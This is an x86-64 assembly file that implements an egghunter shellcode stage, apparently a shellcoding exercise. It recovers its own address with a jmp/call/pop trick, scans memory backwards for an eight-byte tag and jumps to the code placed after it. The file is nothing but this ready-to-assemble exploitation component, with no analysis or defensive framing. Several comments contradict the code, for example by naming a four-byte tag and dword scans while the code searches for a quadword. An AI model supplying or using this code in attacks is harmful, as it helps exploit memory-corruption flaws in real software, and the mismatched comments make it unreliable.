global _start

section .text
_start:

       jmp short call_abc

abc:
        pop rdi                         ; load own address
        sub rdi,46                      ; jump over egghunter code to avoid finding tag for searching
	mov rax,0x8899AABBCCDDEEFF      ; load tag 0xAABBCCDD
        xor rcx,rcx
        mov cx,0xFFFF                   ; search for max 2^16 bytes
        std                             ; set direction flag
                                        ;       -> scasd decrements edi
                                        ;       -> search towards lower emmory

search:
        ; search for tag at the stack
        scasq           ; compares string (dword) in eax and [edi], and increments/decrements
        		; Compare RAX with quadword at RDI or EDI then set status flags.
	jz exec         ; jump to shellcode if egg is found
        add rdi,7       ; search after every byte instead of every 4 bytes to avoid alignment problems

        loop search


exec:
        ; rdi = position of the start of the tag  (88 of 8899AABBCCDDEEFF) - 8 (scasq dec)
        add rdi,16			; +8 (scasq) +8 (tag)
        jmp rdi                         ; jmp to shellcode

call_abc:
        call abc

